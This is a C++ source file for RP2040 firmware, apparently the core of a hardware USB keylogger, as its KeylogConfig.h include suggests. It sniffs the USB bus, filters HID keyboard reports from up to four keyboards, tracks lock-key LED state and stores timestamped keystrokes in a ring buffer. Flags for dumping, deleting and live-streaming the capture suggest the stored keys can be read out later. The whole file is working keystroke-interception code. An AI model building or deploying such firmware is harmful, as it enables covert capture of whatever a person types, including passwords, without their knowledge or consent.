/**
 * @file  SnifferWorker.cpp
 * @brief Core 1 — PIO USB sniffer, HID filter, ring buffer producer.
 *
 * Runs entirely on Core 1.  Registers a packet callback that filters
 * HID keyboard reports, diffs them against per-address baselines, and
 * pushes PackedEvents into the shared ring buffer.
 * Supports up to 4 simultaneous keyboards (LRU eviction).
 * Heartbeat timestamp updated every iteration for Core 0 monitoring.
 * Pause spin-loop has a 500 ms timeout to prevent permanent hangs.
 */

#include "SnifferWorker.h"
#include "KeylogConfig.h"
#include "KeyEncoder.h"
#include <USBSnifferPIO_RP2040.h>
#include <hardware/sync.h>
#include <hardware/timer.h>

// =============================================================================
// SHARED STATE (defined here, declared extern in keylog_config.h)
// =============================================================================

volatile PackedEvent ram_buffer[RAM_BUFFER_SIZE];
volatile uint16_t head_idx = 0;
volatile uint16_t tail_idx = 0;

volatile bool dump_request          = false;
volatile bool dump_hex_request      = false;
volatile bool delete_request        = false;
volatile bool cancel_request        = false;
volatile uint32_t overflow_count     = 0;
volatile uint32_t usb_packets_total  = 0;
volatile uint32_t usb_packets_hid    = 0;
volatile bool core0_request_pause    = false;
volatile bool core1_ack_pause       = false;
volatile bool core1_running         = false;

/** @brief Core 1 heartbeat — updated every iteration. */
volatile uint32_t core1_heartbeat_us = 0;

/** @brief Live mode flag — when true, events are also streamed to Serial. */
volatile bool live_mode_active = false;

// =============================================================================
// PAUSE SPIN TIMEOUT
// =============================================================================

/**
 * @brief Maximum time Core 1 will wait for Core 0 to release the pause.
 * @details 500 ms is generous — flash erase of a 4 KB sector takes ~40 ms.
 *          If Core 0 doesn't release within this window, it's likely dead.
 */
#define CORE1_PAUSE_TIMEOUT_US 500000

// =============================================================================
// INTERNAL STATE (Core 1 only — not shared)
// =============================================================================

/** @brief The PIO sniffer instance. */
static USBSnifferPIO sniffer;

// =============================================================================
// MULTI-KEYBOARD TRACKING
// =============================================================================

/**
 * @struct KeyboardState
 * @brief  Per-device HID report baseline for accurate diffing.
 */
struct KeyboardState {
    uint8_t  addr;             ///< USB device address (1–127, 0 = unused slot)
    uint8_t  last_report[8];   ///< Previous 8-byte HID boot protocol report
    uint32_t last_seen_us;     ///< Timestamp of last valid report (for LRU)
};

/** @brief Tracked keyboard state table. */
static KeyboardState keyboards[MAX_TRACKED_KEYBOARDS] = {};

/**
 * @brief Find an existing keyboard entry or allocate a new one.
 *
 * @param addr  USB device address.
 * @return Pointer to the KeyboardState for this address.
 *
 * @details Search order:
 *          1. Exact match on addr → return immediately.
 *          2. Empty slot (addr == 0) → initialize and return.
 *          3. All slots full → evict the least-recently-seen entry.
 */
static KeyboardState* findOrAllocKeyboard(uint8_t addr) {
    // Search for existing entry
    for (int i = 0; i < MAX_TRACKED_KEYBOARDS; i++) {
        if (keyboards[i].addr == addr) {
            keyboards[i].last_seen_us = time_us_32();
            return &keyboards[i];
        }
    }

    // Search for empty slot
    for (int i = 0; i < MAX_TRACKED_KEYBOARDS; i++) {
        if (keyboards[i].addr == 0) {
            keyboards[i].addr = addr;
            memset(keyboards[i].last_report, 0, 8);
            keyboards[i].last_seen_us = time_us_32();
            return &keyboards[i];
        }
    }

    // Evict least-recently-seen entry (LRU)
    int oldest_idx = 0;
    uint32_t oldest_time = keyboards[0].last_seen_us;

    for (int i = 1; i < MAX_TRACKED_KEYBOARDS; i++) {
        // Signed diff handles time_us_32 wrap correctly
        int32_t diff = (int32_t)(keyboards[i].last_seen_us - oldest_time);
        if (diff < 0) {
            oldest_idx  = i;
            oldest_time = keyboards[i].last_seen_us;
        }
    }

    keyboards[oldest_idx].addr = addr;
    memset(keyboards[oldest_idx].last_report, 0, 8);
    keyboards[oldest_idx].last_seen_us = time_us_32();
    return &keyboards[oldest_idx];
}

// =============================================================================
// LED STATUS TRACKING
// =============================================================================

/**
 * @brief Authoritative LED status byte captured from the USB bus.
 * Layout: Bit 0 = Num Lock, Bit 1 = Caps Lock, Bit 2 = Scroll Lock.
 */
static volatile uint8_t tracked_led_status = 0;

// =============================================================================
// TIMESTAMP STATE
// =============================================================================

static uint32_t last_event_time_us = 0;

// =============================================================================
// USB PID CONSTANTS
// =============================================================================

static constexpr uint8_t PID_IN    = 0x09;
static constexpr uint8_t PID_OUT   = 0x01;
static constexpr uint8_t PID_SETUP = 0x0D;
static constexpr uint8_t PID_SOF   = 0x05;
static constexpr uint8_t PID_DATA0 = 0x03;
static constexpr uint8_t PID_DATA1 = 0x0B;

// =============================================================================
// IN TOKEN TRACKING
// =============================================================================

static uint8_t last_in_addr  = 0;
static uint8_t last_in_endp  = 0;
static bool    last_in_valid = false;

// =============================================================================
// SET_REPORT STATE MACHINE
// =============================================================================

enum SetReportState : uint8_t {
    SR_IDLE,
    SR_SETUP_SEEN,
    SR_SETUP_MATCHED,
    SR_OUT_SEEN
};

static SetReportState sr_state = SR_IDLE;
static uint8_t        sr_addr  = 0;

// =============================================================================
// TIMESTAMP HELPER
// =============================================================================

static uint16_t computeDeltaMs() {
    uint32_t now_us    = time_us_32();
    uint32_t delta_us  = now_us - last_event_time_us;
    last_event_time_us = now_us;

    if (delta_us > 65535000UL) {
        return 65535;
    }
    return (uint16_t)(delta_us / 1000);
}

// =============================================================================
// HID REPORT CALLBACK
// =============================================================================

/**
 * @brief Packet callback — invoked by USBSnifferPIO for every decoded packet.
 *
 * @details Three-phase processing:
 *   Phase 1: TOKEN tracking (IN/SETUP/OUT/SOF).
 *   Phase 2: SET_REPORT capture (LED status).
 *   Phase 3: Keyboard DATA filtering + ring buffer enqueue.
 */
static void onSnifferPacket(const USBPacket& pkt) {

    usb_packets_total++;

    // =================================================================
    // Phase 1: Track TOKEN packets
    // =================================================================
    if (pkt.type == USBPacketType::TOKEN) {
        uint8_t pid_nibble = pkt.pid & 0x0F;

        if (pid_nibble == PID_IN) {
            last_in_addr  = pkt.addr;
            last_in_endp  = pkt.endp;
            last_in_valid = true;

        } else if (pid_nibble == PID_SETUP) {
            sr_state = SR_SETUP_SEEN;
            sr_addr  = pkt.addr;
            last_in_valid = false;

        } else if (pid_nibble == PID_OUT) {
            if (sr_state == SR_SETUP_MATCHED &&
                pkt.addr == sr_addr &&
                pkt.endp == 0) {
                sr_state = SR_OUT_SEEN;
            } else {
                sr_state = SR_IDLE;
            }
            last_in_valid = false;

        } else if (pid_nibble == PID_SOF) {
            // SOF: fires every 1 ms — don't touch state.

        } else {
            last_in_valid = false;
            sr_state = SR_IDLE;
        }
        return;
    }

    // =================================================================
    // Phase 2: SET_REPORT state machine
    // =================================================================
    if (pkt.type == USBPacketType::DATA && sr_state != SR_IDLE) {
        uint8_t pid_nibble = pkt.pid & 0x0F;

        if (sr_state == SR_SETUP_SEEN) {
            if (pid_nibble == PID_DATA0 &&
                pkt.data_length == 8 &&
                pkt.crc_valid &&
                pkt.data[0] == 0x21 &&
                pkt.data[1] == 0x09 &&
                pkt.data[3] == 0x02 &&
                pkt.data[6] == 0x01 &&
                pkt.data[7] == 0x00) {
                sr_state = SR_SETUP_MATCHED;
            } else {
                sr_state = SR_IDLE;
            }
            return;
        }

        if (sr_state == SR_OUT_SEEN) {
            if (pkt.data_length == 1 && pkt.crc_valid) {
                tracked_led_status = pkt.data[0];
            }
            sr_state = SR_IDLE;
            return;
        }

        sr_state = SR_IDLE;
    }

    // =================================================================
    // Phase 3: Filter keyboard DATA packets
    // =================================================================

    if (!pkt.isHIDKeyboardReport()) return;
    if (!pkt.crc_valid) return;
    if (!last_in_valid) return;
    last_in_valid = false;

    if (last_in_endp == 0) return;

    uint8_t curr_report[8];
    memcpy(curr_report, pkt.data, 8);

    if (curr_report[1] != 0x00) return;

    // Validate scancodes in bytes[2-7]
    for (int i = 2; i < 8; i++) {
        uint8_t sc = curr_report[i];
        if (sc == 0x00)                continue;
        if (sc >= 0x01 && sc <= 0x03)  continue;
        if (sc >= 0x04 && sc <= 0x65)  continue;
        if (sc == 0x87)                continue;
        if (sc >= 0xE0 && sc <= 0xE7)  continue;
        return;
    }

    usb_packets_hid++;
    KeyboardState* kb = findOrAllocKeyboard(last_in_addr);

    uint16_t delta_ms = computeDeltaMs();

    PackedEvent events[14];
    uint8_t event_count = processHIDReport(
        kb->last_report,
        curr_report,
        tracked_led_status,
        events
    );

    for (uint8_t i = 0; i < event_count; i++) {
        events[i].delta_ms = delta_ms;
    }

    memcpy(kb->last_report, curr_report, 8);

    // --- Enqueue events into the ring buffer ---
    for (uint8_t i = 0; i < event_count; i++) {
        uint16_t next = (head_idx + 1) % RAM_BUFFER_SIZE;

        if (next == tail_idx) {
            overflow_count++;
            break;
        }

        ram_buffer[head_idx].scancode = events[i].scancode;
        ram_buffer[head_idx].meta     = events[i].meta;
        ram_buffer[head_idx].delta_ms = events[i].delta_ms;

        memory_barrier();
        head_idx = next;
    }
}

// =============================================================================
// CORE 1 PUBLIC API
// =============================================================================

void setupSnifferCore1() {
    last_event_time_us = time_us_32();

    memset(keyboards, 0, sizeof(keyboards));

    if (!sniffer.begin(PIN_SNIFFER_DP)) {
        while (true) {
            tight_loop_contents();
        }
    }

    sniffer.onPacket(onSnifferPacket);
}

void __not_in_flash_func(runSnifferCore1)() {
    core1_running = true;
    memory_barrier();

    while (true) {
        // Update heartbeat timestamp
        core1_heartbeat_us = time_us_32();

        // --- Inter-core pause handshake (for safe flash operations) ---
        if (core0_request_pause) {
            uint32_t ints = save_and_disable_interrupts();

            core1_ack_pause = true;
            memory_barrier();

            // Spin with timeout — prevents permanent
            // hang if Core 0 dies after requesting pause.
            uint32_t pause_start = time_us_32();
            while (core0_request_pause) {
                uint32_t elapsed = time_us_32() - pause_start;
                if (elapsed >= CORE1_PAUSE_TIMEOUT_US) {
                    // Core 0 likely dead — release ourselves
                    break;
                }
                tight_loop_contents();
            }

            core1_ack_pause = false;
            memory_barrier();

            restore_interrupts(ints);
        } else {
            // Normal operation: pump the sniffer's DMA processing loop.
            sniffer.task();
        }
    }
}
